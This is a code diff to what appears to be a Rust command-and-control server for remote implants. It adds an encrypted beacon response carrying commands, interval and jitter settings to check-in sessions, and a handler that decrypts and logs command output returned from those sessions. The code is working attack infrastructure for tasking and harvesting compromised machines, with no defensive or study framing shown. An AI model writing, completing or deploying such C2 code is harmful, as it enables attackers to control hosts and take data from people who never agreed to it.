@@ -74,6 +74,15 @@ struct Session {
     checkins: u64,
 }
 
+#[derive(Debug, Serialize)]
+struct BeaconResponse {
+    commands: Vec<CommandData>,
+    interval: Option<u64>,
+    jitter: Option<u8>,
+    instruction: Option<String>,
+}
+
+
 #[derive(Debug, Clone, Serialize)]
 struct CommandData {
     id: String,
@@ -81,6 +90,14 @@ struct CommandData {
     command_type: String,
     args: Vec<String>,
     timeout: Option<u64>,
+}
+
+#[derive(Debug, Deserialize)]
+struct ResultData {
+    id: String,
+    command_id: String,
+    result: Result<String, String>,
+    timestamp: i64,
 }
 
 struct AppState {
@@ -100,6 +117,7 @@ async fn handle_beacon(State(state): State<Arc<AppState>>, body: Bytes) -> Resul
     // Parse beacon data
     let data: BeaconData = serde_json::from_slice(&plaintext).map_err(|e| {
         eprintln!("[x] JSON parse failed: {}", e);
+        println!("{:?}", plaintext);
         StatusCode::BAD_REQUEST
     })?;
 
@@ -146,12 +164,39 @@ async fn handle_beacon(State(state): State<Arc<AppState>>, body: Bytes) -> Resul
         }
     }
 
-    // TODO: Build response
-    unimplemented!()
+    let response = BeaconResponse {
+        commands,
+        interval: None,
+        jitter: None,
+        instruction: None,
+    };
+
+    let response_json = serde_json::to_vec(&response).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    let encrypted = state.crypto.encrypt(&response_json).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+    Ok(Bytes::from(encrypted))
 }
 
-async fn handle_result() {
-    unimplemented!()
+async fn handle_result(State(state): State<Arc<AppState>>, body: Bytes) -> Result<StatusCode, StatusCode> {
+    let plaintext = state.crypto.decrypt(&body).map_err(|_| StatusCode::BAD_REQUEST)?;
+    let data: ResultData = serde_json::from_slice(&plaintext).map_err(|_| StatusCode::BAD_REQUEST)?;
+    let (success, output) = match &data.result {
+        Ok(s) => (true, s.clone()),
+        Err(s) => (false, s.clone()),
+    };
+
+    println!("| Session:    {}", data.id);
+    println!("| Command:    {}", data.command_id);
+    println!("| Status:    {}", if success { "SUCCESS" } else { "FAILED" });
+    println!("| Output:");
+    for line in output.lines() {
+        println!("|     {}", line);
+    }
+
+    let mut results = state.results.write().await;
+    results.push((data.id, data.command_id, success, output));
+
+    Ok(StatusCode::OK)
 }
 
 async fn list_sessions(state: &Arc<AppState>) {
@@ -236,9 +281,7 @@ async fn main() {
 
     tokio::spawn(async move {
         let listener = tokio::net::TcpListener::bind(&addr).await.unwrap();
-        axum::serve(listener, app.into_make_service())
-            .await
-            .unwrap();
+        axum::serve(listener, app.into_make_service()).await.unwrap();
     });
 
     cli_loop(state).await
